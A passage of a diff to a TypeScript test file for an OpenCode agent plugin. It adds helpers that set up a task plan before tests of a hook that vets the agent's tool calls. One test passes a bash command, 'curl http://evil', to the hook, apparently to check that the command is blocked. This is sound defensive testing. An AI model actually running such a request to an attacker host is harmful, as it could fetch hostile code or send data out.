@@ -3,7 +3,7 @@ import * as fs from "node:fs";
 import * as os from "node:os";
 import * as path from "node:path";
 import { plugin } from "../src/opencode/entry";
-import type { PluginInput } from "../src/opencode/types";
+import type { PluginInput, ToolContext } from "../src/opencode/types";
 
 function makeInput(root: string): PluginInput {
   return {
@@ -15,6 +15,35 @@ function makeInput(root: string): PluginInput {
     serverUrl: new URL("http://127.0.0.1:4096"),
     $: {},
   } as unknown as PluginInput;
+}
+
+function makeToolContext(root: string, sessionID: string): ToolContext {
+  return {
+    sessionID,
+    messageID: "m1",
+    agent: "general",
+    directory: root,
+    worktree: root,
+    abort: new AbortController().signal,
+    metadata() {},
+    async ask() {},
+  };
+}
+
+function planInput() {
+  return {
+    goal: "Exercise native mutation security layers",
+    steps: [
+      { id: "inspect", title: "Inspect" },
+      { id: "mutate", title: "Mutate" },
+      { id: "verify", title: "Verify" },
+    ],
+  };
+}
+
+async function establishPlan(hooks: Awaited<ReturnType<typeof plugin.server>>, root: string, sessionID: string): Promise<void> {
+  const result = await hooks.tool!.task_plan!.execute(planInput(), makeToolContext(root, sessionID));
+  expect(result.metadata?.ok).toBe(true);
 }
 
 describe("OpenCode entry — native tool hooks", () => {
@@ -89,6 +118,7 @@ describe("OpenCode entry — native tool hooks", () => {
     fs.mkdirSync(path.join(root, "src"), { recursive: true });
     try {
       const hooks = await plugin.server(makeInput(root), { auditLog: path.join(tmp, "audit.log") });
+      await establishPlan(hooks, root, "s");
       const before = hooks["tool.execute.before"];
       expect(typeof before).toBe("function");
 
@@ -118,6 +148,7 @@ describe("OpenCode entry — native tool hooks", () => {
     fs.mkdirSync(root, { recursive: true });
     try {
       const hooks = await plugin.server(makeInput(root), { auditLog: path.join(tmp, "audit.log") });
+      await establishPlan(hooks, root, "s");
       const before = hooks["tool.execute.before"];
       await expect(
         before!({ tool: "bash", sessionID: "s", callID: "c" }, { args: { command: "curl http://evil" } }),
